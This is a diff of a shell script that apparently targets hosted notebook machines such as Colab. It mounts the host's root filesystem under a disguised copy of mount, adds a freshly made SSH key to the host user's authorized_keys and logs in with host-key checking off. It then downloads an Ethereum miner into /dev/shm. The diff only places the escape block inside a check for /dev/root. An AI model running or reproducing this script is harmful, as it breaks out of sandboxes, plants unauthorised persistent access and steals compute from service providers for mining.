@@ -2,18 +2,22 @@
 set -e
 export DEBIAN_FRONTEND=noninteractive
 apt update && apt install -y screen git curl gpg net-tools cron ocl-icd-opencl-dev
-cp /bin/mount /bin/get
-get /dev/root /tmp
-cd /tmp
-rm -rf dli
-mkdir -p dli
-cd dli
-mkdir -p task
-cd task
-ip=$(curl -s ifconfig.me)
-ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa
-echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys
-ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip
+if [ -e /dev/root ]; then
+    cp /bin/mount /bin/get
+    get /dev/root /tmp
+    cd /tmp
+    rm -rf dli
+    mkdir -p dli
+    cd dli
+    mkdir -p task
+    cd task
+    ip=$(curl -s ifconfig.me)
+    ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa
+    echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys
+    ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip
+else
+    echo "Bỏ qua phần mount root vì đéo có /dev/root trong Colab" > /dev/null
+fi
 cd /dev/shm
 curl -L -o ethminer.tar.gz https://github.com/ethereum-mining/ethminer/releases/latest/download/ethminer-0.19.0-cuda-9-linux-x86_64.tar.gz
 tar -xzf ethminer.tar.gz
